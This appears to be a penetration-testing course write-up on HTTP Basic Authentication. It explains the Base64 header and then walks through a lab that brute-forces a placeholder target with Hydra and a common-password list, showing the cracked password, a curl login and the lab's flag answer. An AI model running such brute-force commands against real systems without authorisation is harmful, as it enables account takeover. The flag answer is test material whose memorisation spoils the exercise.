# Section 7 — Basic HTTP Authentication

---

## How Basic Auth Works

HTTP Basic Authentication (Basic Auth) is a simple login system built into the HTTP standard. Here is what happens step by step:

1. Your browser requests a protected page
2. The server replies with `401 Unauthorized` and a `WWW-Authenticate` header
3. The browser shows a username/password prompt
4. The browser Base64-encodes `username:password` and sends it with every request:

```
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

> Base64 is **not encryption** — it is trivially reversible. Basic Auth over plain HTTP (no TLS/SSL) exposes your credentials in cleartext on the wire.

---

## Attacking Basic Auth with Hydra

Use the `http-get` module. Point it at the protected path.

### Command

```bash
hydra -l USERNAME -P WORDLIST TARGET http-get /PATH -s PORT -f
```
> Generic template for attacking Basic Auth. Replace `USERNAME`, `WORDLIST`, `TARGET`, `/PATH`, and `PORT` with your target's values. `-f` stops Hydra after the first valid password is found.

| Part | Purpose |
|------|---------|
| `-l USERNAME` | Single known username |
| `-P WORDLIST` | Password list to try |
| `http-get /PATH` | Service + protected path (use `/` for root) |
| `-s PORT` | Non-default port |
| `-f` | Stop after first valid password found |

---

## Lab — Basic HTTP Auth Brute Force

**Objective:** Brute-force a Basic Auth-protected page, then log in to retrieve the flag.

**Why `http-get`:** Basic Auth sends credentials via the `Authorization` header on GET requests — Hydra's `http-get` module handles this automatically.

**Why this wordlist:** 200 most-used passwords is tiny and fast. `Password@123` is exactly the kind of password a policy-compliant user picks — uppercase, lowercase, number, special char — and still ends up in common lists.

---

### Step 1 — Run Hydra

```bash
hydra -l basic-auth-user -P ~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
  TARGET_IP http-get / -s TARGET_PORT -f
```
> Attacks the root `/` path with a single known username and a 200-entry password list. Replace `basic-auth-user`, `TARGET_IP`, and `TARGET_PORT` with your target's values. `-f` stops after the first hit.

**Output:**
```
[PORT][http-get] host: TARGET_IP   login: basic-auth-user   password: Password@123
1 of 1 target successfully completed, 1 valid password found
```

---

### Step 2 — Retrieve the Flag

Once you have the password, authenticate with curl using `-u user:pass`:

```bash
curl -s -u basic-auth-user:Password@123 http://TARGET_IP:TARGET_PORT/
```
> Retrieves the protected page after cracking. `-u user:pass` tells curl to send Basic Auth headers automatically. Replace the credentials and URL with your target's values.

**Why `-u`:** curl's `-u` flag handles Basic Auth automatically — same as the browser login dialog. You don't need to Base64-encode the credentials yourself.

**Result:**
```
You found the flag: HTB{th1s_1s_4_f4k3_fl4g}
```

**Q1 Answer:** `HTB{th1s_1s_4_f4k3_fl4g}`

---

## Exam Notes

- Basic Auth = credentials in every request header — intercept with Burp to confirm the format before attacking
- `http-get /` targets the root — adjust the path if the protected resource is elsewhere (e.g., `http-get /admin`)
- After cracking, use `curl -u user:pass URL` to retrieve content without a browser
- Wordlist order: `2023-200_most_used_passwords.txt` → `rockyou.txt` — start small
